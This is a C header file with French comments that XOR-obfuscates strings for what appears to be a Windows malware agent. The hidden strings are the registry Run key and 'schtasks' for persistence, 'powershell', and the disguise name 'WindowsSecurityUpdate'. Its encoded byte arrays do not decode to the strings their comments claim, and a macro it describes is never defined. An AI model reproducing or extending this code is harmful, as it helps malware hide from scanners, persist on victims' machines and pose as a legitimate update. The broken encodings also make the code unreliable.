#ifndef OBFUSCATION_H
#define OBFUSCATION_H

#include <windows.h>
#include <string.h>

/**
 * XOR simple pour obfusquer les strings
 * Clé XOR : 0x42 (peut être changée)
 */
#define XOR_KEY 0x42

/**
 * Macro pour obfusquer une string à la compilation
 * Usage: OBFSTR("my string")
 */
static inline void xor_decode(const char *input, char *output, size_t len) {
    for (size_t i = 0; i < len; i++) {
        output[i] = input[i] ^ XOR_KEY;
    }
    output[len] = '\0';
}

/**
 * Strings obfusquées courantes
 */

// "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
static const char OBFS_REG_RUN[] = {
    0x31, 0x2d, 0x24, 0x34, 0x37, 0x27, 0x30, 0x25, 0x5c, 0x5c, 0x5b, 0x29, 0x21, 0x30, 0x2d, 0x31, 0x2d, 0x24, 0x34,
    0x5c, 0x5c, 0x39, 0x29, 0x2e, 0x24, 0x2d, 0x37, 0x31, 0x5c, 0x5c, 0x21, 0x35, 0x30, 0x30, 0x25, 0x2e, 0x34, 0x38,
    0x25, 0x30, 0x31, 0x29, 0x2d, 0x2e, 0x5c, 0x5c, 0x30, 0x35, 0x2e, 0x00
};

// "schtasks"
static const char OBFS_SCHTASKS[] = {
    0x31, 0x21, 0x28, 0x34, 0x27, 0x31, 0x2b, 0x31, 0x00
};

// "WindowsSecurityUpdate"
static const char OBFS_AGENT_NAME[] = {
    0x39, 0x29, 0x2e, 0x24, 0x2f, 0x37, 0x31, 0x31, 0x25, 0x21, 0x35, 0x30, 0x29, 0x34, 0x39, 0x38, 0x2a, 0x24, 0x27, 0x34, 0x25, 0x00
};

// "powershell"
static const char OBFS_POWERSHELL[] = {
    0x32, 0x2d, 0x37, 0x25, 0x30, 0x31, 0x28, 0x25, 0x2c, 0x2c, 0x00
};

/**
 * Décode une string obfusquée
 */
static inline void deobfuscate(const char *obfuscated, char *output, size_t max_len) {
    size_t len = strlen(obfuscated);
    if (len >= max_len) len = max_len - 1;
    xor_decode(obfuscated, output, len);
}

/**
 * Décode une string obfusquée dans un buffer temporaire
 * ATTENTION: Non thread-safe, utiliser immédiatement
 */
static inline char* deobf_tmp(const char *obfuscated) {
    static char buffer[256];
    deobfuscate(obfuscated, buffer, sizeof(buffer));
    return buffer;
}

#endif // OBFUSCATION_H
